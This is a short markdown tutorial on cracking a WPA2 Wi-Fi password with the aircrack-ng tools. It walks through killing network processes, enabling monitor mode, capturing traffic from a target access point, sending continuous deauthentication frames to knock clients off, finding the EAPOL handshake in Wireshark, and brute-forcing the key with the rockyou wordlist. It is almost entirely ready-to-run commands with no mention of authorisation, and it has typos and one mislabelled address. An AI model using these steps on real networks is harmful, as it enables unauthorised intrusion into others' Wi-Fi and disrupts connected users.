# Cracking Wifi WPA2 Handshake:
First stop the current netwok processes
```bash
airmon-ng check kill
```
Then change the managed mode to monitor mode.
```bash
airmon-ng start wlan0
```
then have to discover the wifi networks. For that exxcute
```bash
airodump-ng wlan0
```
After finding the target wifi, execute ["F0:B4:D2:62:54:BF" is the mac/bssid of the wifi] to see the connected clients to that wifi.
```bash
airodump-ng wlan0 -d F0:B4:D2:62:54:BF
```
Now execute to store the impormation to crack. "-w hack1" is to tell to store the information to that file. "F0:B4:D2:62:54:BF" is the wifi mac/bssid address.
```bash
airodump-ng -w hack1 -c 1 --bssid F0:B4:D2:62:54:BF wlan0
```
Open a second terminal to deauthenticate a client to fetch the handshake. "F0:B4:D2:62:54:BF" is the bssid of the client.
```bash
aireplay-ng --deauth 0 -a F0:B4:D2:62:54:BF wlan0
```
After capturing the handshake, close the processes. Then use the below command.
```bash
wireshark hack1-01.cap
```
It will open the file in wireshark. Search "eapol" in search field of wireshark. There will be 4 "eapol" procol which are used for the handshake. Now stop the monitor mode of the interface.
```bash
airmon-ng stop wlan0
```
Then execute below code to crack the password of the wifi.
```bash
aircrack-ng hack1-01.cap -w /usr/share/wordlists/rockyou.txt
```
If the password is in this file, then you will get the password like "KEY FOUND! [wifi_password]"